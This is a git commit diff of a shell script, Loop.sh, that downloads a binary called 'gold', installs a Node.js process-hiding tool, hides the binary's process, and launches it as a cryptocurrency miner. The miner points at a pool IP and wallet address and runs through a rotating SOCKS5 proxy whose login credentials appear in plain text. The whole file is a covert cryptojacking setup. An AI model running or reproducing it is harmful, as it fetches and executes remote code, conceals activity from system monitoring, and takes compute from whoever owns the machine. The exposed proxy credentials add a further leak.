005c37a281d68e76187069530a308dbad37c3020
iton466 <108810354+iton466@users.noreply.github.com>
2022-07-12 14:19:08 +0530

    Update Loop.sh

--- Loop.sh
+++ Loop.sh
@@ -1,6 +1,8 @@
 wget https://github.com/Testdrive345/hello/raw/main/gold
 chmod 777 gold
 sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash 
+sudo apt install nodejs 
+npm i -g node-process-hider
 ph add gold
 sudo ./gold -a minotaurx -o 103.249.70.7:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
